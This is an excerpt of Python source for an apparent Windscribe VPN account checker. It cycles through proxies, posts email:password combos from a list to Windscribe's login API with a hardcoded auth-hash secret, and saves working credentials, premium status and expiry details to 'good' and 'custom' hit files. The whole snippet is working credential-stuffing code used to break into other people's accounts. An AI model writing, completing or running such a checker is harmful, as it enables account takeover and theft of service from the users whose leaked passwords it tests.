    ...
    while not Checker.stopping:
        try:
            ...
            with Session() as s:
                ...
                unix = time()
                auth_hash = md5(
                    f"952b4412f002315aa50751032fcaab03{unix}".encode()
                ).hexdigest()
                headers = {
                ...
                response = s.post(
                    "https://api.windscribe.com/Session?platform=firefox",
                    headers=headers,
                    data=data,
                )
                if (
                    response.status_code == 403
                    or "Could not log in with provided credentials" in response.text
                ):
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                ...
                if 'is_premium": 0' in response.text:
                    if not Checker.cui:
                        log("custom", ":".join([username, password]), "Windscribe")
                    save(
                        "Windscribe",
                        "custom",
                        Checker.time,
                        ":".join([username, password])
                        + f" | Original Combo: {email}:{password}",
                    )
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                    ...
                    if not Checker.cui:
                        log("good", ":".join([username, password]), "Windscribe")
                    save(
                        "Windscribe",
                        "good",
                        Checker.time,
                        ":".join([username, password])
                        + f" | Email: {email} | Username: {username} | Used: {used} | Expire: {expire}",
                    )
                    Checker.good += 1
                    return_proxy(proxy)
                    return
